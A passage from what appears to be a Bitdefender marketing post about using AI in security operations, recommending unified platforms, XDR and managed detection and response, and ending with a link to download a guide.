-In prevention, properly operationalized AI can prioritize exposed assets, risky configurations, and excessive privileges. In protection, it can stop malicious activity before it becomes an incident. In detection, it can correlate signals that appear harmless on their own. In response, it can guide investigation and containment without requiring every administrator to become a security specialist.
-
-These benefits from operationalized AI most often appear within unified security platforms.
-
-Why Is Operationalizing AI Within a Cybersecurity Platform Often the Best Approach?
-
-AI becomes most valuable when it can see and act across connected security functions.
-
-Many organizations already have powerful Endpoint Detection and Response capabilities but cannot use them fully because setup is complex, alerts are plentiful, and specialist expertise is limited. Adding AI to underused EDR does not correct the mismatch between the technology and its operators.
-
-A unified platform provides a more practical foundation. Native integrations and ready-to-use workflows reduce development and tuning. Native XDR can correlate high-value signals across endpoints, identity, cloud, network, and email without requiring dozens of separate integrations.
-
-Just as importantly, a platform can extend AI beyond detection and response into prevention-first security. Reducing exposure and blocking common attack paths early lowers the volume of incidents that reach already-stretched teams.
-
-Does AI in Security Replace Human Analysts?
-
-Operationalizing AI in cyber defense does not eliminate the need for people. Instead, it makes human judgment more scalable. AI accelerates analysis; analysts validate what matters and when to act.
-
-For organizations unable to maintain continuous monitoring and response expertise, the benefits of operationalizing can be most easily realized through Managed Detection and Response (MDR), which can quickly add an AI-enabled SOC to protect your environment around the clock.
-
-What’s In the New Guide to Operationalizing AI in Security?
-
-The new Bitdefender guide explains how to evaluate AI’s real value, strengthen prevention-first security, add context through native XDR, assess MDR's role, and follow a five-point plan for operationalizing AI across the threat lifecycle.
-
-Mid-market organizations do not need to replicate the tools, staffing, and complexity of the largest enterprises. They need an attainable operating model that broadens coverage, reduces exposure, and helps lean teams respond confidently.
-
-Download Operationalizing AI Across Prevention, Protection, Detection and Response"
